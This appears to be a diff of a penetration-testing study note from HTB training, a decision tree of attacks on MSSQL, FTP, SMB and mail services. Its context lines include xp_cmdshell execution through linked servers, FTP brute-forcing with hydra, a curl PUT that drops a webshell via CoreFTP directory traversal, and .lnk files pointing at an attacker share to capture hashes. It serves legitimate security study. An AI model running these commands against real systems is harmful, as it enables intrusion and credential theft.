@@ -1,6 +1,6 @@
 # Service Attacks, Decision Tree
 
-Part of [[DECISION TREE]]. "I have access to service X — what's the attack chain?" Covers MSSQL, FTP, SMB, and web services.
+Part of [[DECISION TREE]]. "I have access to service X, what's the attack chain?" Covers MSSQL, FTP, SMB, and web services.
 
 ---
 
@@ -8,7 +8,7 @@ Part of [[DECISION TREE]]. "I have access to service X — what's the attack cha
 
 ### Got MSSQL credentials (or anonymous access) — what can I escalate to?
 
-Work through this chain in order — each step unlocks the next if the simpler ones don't yield access:
+Work through this chain in order, each step unlocks the next if the simpler ones don't yield access:
 
 **Step 1 — Get a client connected:**
 ```bash
@@ -62,7 +62,7 @@ EXECUTE ('SELECT SYSTEM_USER') AT [<linked-server-name>];
 EXECUTE ('EXECUTE (''xp_cmdshell ''''whoami'''''') AT [INNER_SERVER]') AT [OUTER_SERVER];
 ```
 
-→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.6 MSSQL — xp_dirtree UNC Hash Coercion|CS.6]] through [[Attacking Common Services (HTB Supplementary)#CS.9 MSSQL — Linked Server Execution|CS.9]]
+→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.6 MSSQL, xp_dirtree UNC Hash Coercion|CS.6]] through [[Attacking Common Services (HTB Supplementary)#CS.9 MSSQL. Linked Server Execution|CS.9]]
 
 ---
 
@@ -91,7 +91,7 @@ hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 1
 
 **Step 4 — Check for known CVEs:**
 → ProFTPd 1.3.5: `mod_copy` module allows unauthenticated file copy (`SITE CPFR`/`SITE CPTO`)
-→ CoreFTP 725: directory traversal via PUT request — see below
+→ CoreFTP 725: directory traversal via PUT request, see below
 
 ---
 
@@ -104,7 +104,7 @@ curl -k -X PUT -H 'Content-Type: application/x-www-form-urlencoded' \
   -d @webshell.php
 ```
 `<traversal>` example: `/../../../../../../xampp/htdocs/webshell.php` (adapt depth and web root to target).
-`--path-as-is` is critical — without it curl normalises the `../` sequences away before sending.
+`--path-as-is` is critical, without it curl normalises the `../` sequences away before sending.
 
 → Full reference: [[Attacking Common Services (HTB Supplementary)#CS.3 CoreFTP Directory Traversal (CVE-2022-22836)|CS.3]]
 
@@ -135,7 +135,7 @@ smbclient //<target>/<share> -U <user>%<pass>
 
 **Step 4 — Check write access to shares containing scripts/binaries:**
 → Write a malicious script that calls back when executed by another user or service
-→ Drop a `.lnk` or `.url` file pointing to `\\kali-ip\share` — any user browsing the share with Windows Explorer triggers an SMB auth (captured by Responder)
+→ Drop a `.lnk` or `.url` file pointing to `\\kali-ip\share`, any user browsing the share with Windows Explorer triggers an SMB auth (captured by Responder)
 
 → Full reference: [[Attacking Common Services (HTB Supplementary)#CS.13 SMB Enumeration and Null Sessions|CS.13]]
 
@@ -163,7 +163,7 @@ LIST                    # list messages (N bytes each)
 RETR 1                  # read message 1
 QUIT
 ```
-→ Emails often contain credentials, internal hostnames, or attachment leads — always read them.
+→ Emails often contain credentials, internal hostnames, or attachment leads, always read them.
 → Full reference: [[Attacking Common Services (HTB Supplementary)#CS.1 Hydra SMTP with Email-Format Usernames|CS.1]], [[Attacking Common Services (HTB Supplementary)#CS.2 POP3 Manual nc Session|CS.2]]
 
 #### Tags: #DecisionTree #ServiceAttacks #MSSQL #FTP #SMB #SMTP #POP3 #CoreFTP #xpdirtree #Impersonation #LinkedServer
